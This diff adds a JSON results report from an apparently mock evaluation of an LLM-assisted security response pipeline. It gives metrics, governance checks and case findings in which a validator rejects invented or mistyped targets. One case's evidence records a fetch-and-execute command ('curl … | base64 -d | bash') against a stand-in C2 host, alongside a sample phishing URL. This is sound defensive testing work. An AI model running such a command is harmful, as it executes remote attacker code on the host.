@@ -1,0 +1,290 @@
+{
+  "generatedAt": "2026-10-02T07:36:48.046Z",
+  "database": "soar_mockv2_eval",
+  "mainRun": "mock-evaluation-v2-20261002",
+  "rejectRun": "none",
+  "model": null,
+  "cases": {
+    "total": 10,
+    "attempted": 9,
+    "PASS": 6,
+    "FAIL": 1,
+    "INCOMPLETE": 2,
+    "ENVIRONMENT_UNAVAILABLE": 1
+  },
+  "table": [
+    {
+      "metric": "Recommendation Compliance",
+      "result": 100,
+      "unit": "%",
+      "n": "8/8 evaluated; 8/9 attempted = 88.89%",
+      "source": "DB",
+      "notes": "deterministic six-criterion evaluator vs frozen Ground Truth"
+    },
+    {
+      "metric": "Investigation Time",
+      "result": 116.937,
+      "unit": "seconds",
+      "n": 8,
+      "source": "DB",
+      "notes": "median 81.749, SD 80.596, min 46.191, max 293.989; missing 1"
+    },
+    {
+      "metric": "Time-to-Decision",
+      "result": 0.063,
+      "unit": "seconds",
+      "n": 8,
+      "source": "DB",
+      "notes": "median 0.064, SD 0.01, min 0.051, max 0.083; scripted IR decision"
+    },
+    {
+      "metric": "Workflow Completion",
+      "result": 66.67,
+      "unit": "%",
+      "n": "6/9",
+      "source": "DB",
+      "notes": "all 12 stages + supported final state"
+    },
+    {
+      "metric": "Intervention Rate",
+      "result": 22.22,
+      "unit": "%",
+      "n": "2/9",
+      "source": "DB",
+      "notes": "TC-03: Missing IOC / target not evidence-linked (e-mail); TC-08: Missing evidence (COMMAND_LINE / process)"
+    },
+    {
+      "metric": "Recommendation Retry Rate",
+      "result": 33.33,
+      "unit": "%",
+      "n": "3/9",
+      "source": "DB",
+      "notes": "total retry count 8 (a count); infrastructure failures excluded: 0"
+    },
+    {
+      "metric": "Mock Verification",
+      "result": 100,
+      "unit": "%",
+      "n": "10/10",
+      "source": "DB (archived MOCK baseline, frozen)",
+      "notes": "completion of a SIMULATED re-hunt (NO_MATCH simulated); not evidence of threat removal; not re-run"
+    },
+    {
+      "metric": "Real Wazuh Verification",
+      "result": 75,
+      "unit": "%",
+      "n": "6/8",
+      "source": "DB",
+      "notes": "outcomes {\"RESOLVED\":6,\"ERROR\":2}"
+    },
+    {
+      "metric": "Recommendation Consistency",
+      "result": 100,
+      "unit": "%",
+      "n": "30/30",
+      "source": "DB evidence snapshots + live LLM generation (data/consistency.json)",
+      "notes": "repeated runs on identical evidence; recommendations not persisted"
+    },
+    {
+      "metric": "Step-set Consistency",
+      "result": 93.33,
+      "unit": "%",
+      "n": "28/30",
+      "source": "data/consistency.json",
+      "notes": "complete validated step set identical"
+    },
+    {
+      "metric": "Negative Validation",
+      "result": "NOT AVAILABLE",
+      "unit": "%",
+      "n": "-",
+      "source": "controlled validator scenarios on DB-backed catalog (data/negative.json)",
+      "notes": "controlled invalid recommendations; NEG-02 is the Action-Knowledge/validator layer, not a Policy rejection"
+    },
+    {
+      "metric": "Human/Policy Validation",
+      "result": null,
+      "unit": "%",
+      "n": "0/0",
+      "source": "DB (soar_final_eval) governance gates G0-G16 + IR-reject run IRR-01..IRR-12",
+      "notes": "governance gates + IR reject flow"
+    }
+  ],
+  "principles": {
+    "severity_from_wazuh_not_ai": {
+      "ok": true,
+      "detail": "incident.priority == alert.severity for 9/9; severity equals the deterministic Wazuh rule-level mapping; severity-change audit records: 0"
+    },
+    "no_response_executed_without_ir_approval": {
+      "ok": true,
+      "detail": "every executed ticket has an approved IR_TEAM decision recorded at or before execution"
+    },
+    "no_incident_closed_by_ai": {
+      "ok": true,
+      "detail": "every RESOLVED incident has a RESOLVED real verification and an INCIDENT_RESOLVED audit record written by the verification flow (actor = the IR verifier), never by an AI agent"
+    },
+    "ir_is_decision_authority": {
+      "ok": true,
+      "detail": "all decided approvals carry approval_role IR_TEAM"
+    },
+    "timestamps_monotonic": {
+      "ok": true,
+      "detail": "alert ≤ incident ≤ investigation ≤ recommendation ≤ decision ≤ response ≤ verification in every case"
+    }
+  },
+  "crossDiffs": [],
+  "findings": {
+    "TC03_email_target": {
+      "observed": {
+        "retries": {
+          "MODEL_OUTPUT_REJECTED_BY_VALIDATOR": 2
+        },
+        "validatorViolations": [
+          "INVENTED_TARGET: step 1 (ACT-QUARANTINE-EMAIL): target \"it-support@vigix-eval-phish.net\" is not an evidence-linked/analyst-added IOC or an affected host",
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-QUARANTINE-EMAIL): target \"http://vigix-eval-phish.net/o365/verify?id=hr.clerk\" is a url, but ACT-QUARANTINE-EMAIL operates on a email",
+          "INVENTED_TARGET: step 2 (ACT-BLOCK-URL): target \"http://vigix-eval-phish.net/o36로5/verify?id=hr.clerk\" is not an evidence-linked/analyst-added IOC or an affected host"
+        ],
+        "analystAdded": [
+          {
+            "type": "URL",
+            "value": "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+            "by": "eval-soc",
+            "source": "aggregated"
+          },
+          {
+            "type": "DOMAIN",
+            "value": "vigix-eval-phish.net",
+            "by": "eval-soc",
+            "source": "aggregated"
+          },
+          {
+            "type": "IPV4",
+            "value": "203.0.113.45",
+            "by": "eval-soc",
+            "source": "aggregated"
+          },
+          {
+            "type": "EMAIL",
+            "value": "it-support@vigix-eval-phish.net",
+            "by": "eval-soc",
+            "source": "aggregated"
+          }
+        ],
+        "finalRecommendation": [
+          {
+            "order": 1,
+            "action": "ACT-QUARANTINE-EMAIL",
+            "target": "it-support@vigix-eval-phish.net",
+            "requiresApproval": false,
+            "evidenceRefs": [
+              "VIGIX-EVAL: phishing email with a credential-harvesting link delivered to a user mailbox",
+              "it-support@vigix-eval-phish.net"
+            ]
+          },
+          {
+            "order": 2,
+            "action": "ACT-BLOCK-URL",
+            "target": "http://vigix-eval-phish.net/o365/verify?id=hr.clerk",
+            "requiresApproval": false,
+            "evidenceRefs": [
+              "VIGIX-EVAL: phishing email with a credential-harvesting link delivered to a user mailbox",
+              "http://vigix-eval-phish.net/o365/verify?id=hr.clerk"
+            ]
+          },
+          {
+            "order": 3,
+            "action": "ACT-BLOCK-DOMAIN",
+            "target": "vigix-eval-phish.net",
+            "requiresApproval": false,
+            "evidenceRefs": [
+              "VIGIX-EVAL: phishing email with a credential-harvesting link delivered to a user mailbox",
+              "vigix-eval-phish.net"
+            ]
+          },
+          {
+            "order": 4,
+            "action": "ACT-ISOLATE-ENDPOINT",
+            "target": "attack-endpoint",
+            "requiresApproval": true,
+            "evidenceRefs": [
+              "VIGIX-EVAL: phishing email with a credential-harvesting link delivered to a user mailbox"
+            ]
+          }
+        ],
+        "compliance": "COMPLIANT"
+      },
+      "note": "ACT-QUARANTINE-EMAIL needs an evidence-backed e-mail target; no silent correction occurred — any correction is listed as an intervention"
+    },
+    "TC08_command_line": {
+      "observed": {
+        "retries": {
+          "MODEL_OUTPUT_REJECTED_BY_VALIDATOR": 5
+        },
+        "violations": [
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-KILL-PROCESS): target \"attack-endpoint\" is a host, but ACT-KILL-PROCESS operates on a process",
+          "INSUFFICIENT_EVIDENCE: step 1 (ACT-KILL-PROCESS): required evidence is not recorded for target \"attack-endpoint\": COMMAND_LINE",
+          "TARGET_TYPE_MISMATCH: step 2 (ACT-QUARANTINE-FILE): target \"attack-endpoint\" is a host, but ACT-QUARANTINE-FILE operates on a file",
+          "INSUFFICIENT_EVIDENCE: step 2 (ACT-QUARANTINE-FILE): required evidence is not recorded for target \"attack-endpoint\": FILE_HASH",
+          "TARGET_TYPE_MISMATCH: step 1 (ACT-KILL-PROCESS): target \"attack-endpoint\" is a host, but ACT-KILL-PROCESS operates on a process"
+        ],
+        "analystAdded": [
+          {
+            "type": "PROCESS_NAME",
+            "value": "/tmp/.cache/kworkerd",
+            "by": "eval-soc",
+            "source": "analyst enrichment (from alert evidence)"
+          },
+          {
+            "type": "COMMAND_LINE",
+            "value": "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash",
+            "by": "eval-soc",
+            "source": "analyst enrichment (from alert evidence)"
+          }
+        ],
+        "compliance": "NOT_EVALUATED"
+      }
+    },
+    "TC07_variation": {
+      "primaryActionDistribution": {
+        "PB-C2|ACT-BLOCK-DESTINATION-IP|ip|172.19.0.5": 5
+      },
+      "isolateEndpointAsPrimaryRuns": [],
+      "selfTargetingIpSteps": [],
+      "mainRunTc07SelfTargeting": [],
+      "classification": "recommendation consistency / step-level variation — NOT a compliance failure unless the six criteria fail (see TC-07 compliance in final-recommendation-compliance.json)"
+    },
+    "TC09_infrastructure": {
+      "infrastructureEventsMainRun": [],
+      "consistencyInfrastructureFailures": [
+        {
+          "case_id": "TC-02",
+          "repetition": 3,
+          "attempt": 1,
+          "at": "2026-10-02T07:18:20.149Z",
+          "classification": "INFRASTRUCTURE",
+          "detail": "AI orchestrator responded with 504 for recommendation generation: {\"detail\":{\"error\":\"LLM_TIMEOUT\",\"message\":\"LLM did not answer within 120.0s\"}}",
+          "generation_seconds": 128.77,
+          "recovered": true,
+          "waitedSeconds": 1
+        },
+        {
+          "case_id": "TC-07",
+          "repetition": 5,
+          "attempt": 1,
+          "at": "2026-10-02T07:31:12.473Z",
+          "classification": "INFRASTRUCTURE",
+          "detail": "AI orchestrator responded with 502 for recommendation generation: {\"detail\":{\"error\":\"INVALID_LLM_OUTPUT\",\"message\":\"LLM response is not valid JSON: Expecting value\"}}",
+          "generation_seconds": 72.6,
+          "recovered": true,
+          "waitedSeconds": 0
+        }
+      ],
+      "note": "infrastructure failures are preserved and classified separately from model results"
+    },
+    "TC10_t1098_playbook": {
+      "selectedPlaybook": "PB-ACCOUNT-COMPROMISE",
+      "expected": "PB-ACCOUNT-COMPROMISE",
+      "note": "T1098 maps to PB-ACCOUNT-COMPROMISE per the frozen Ground Truth; mapping not changed"
+    }
+  }
+}
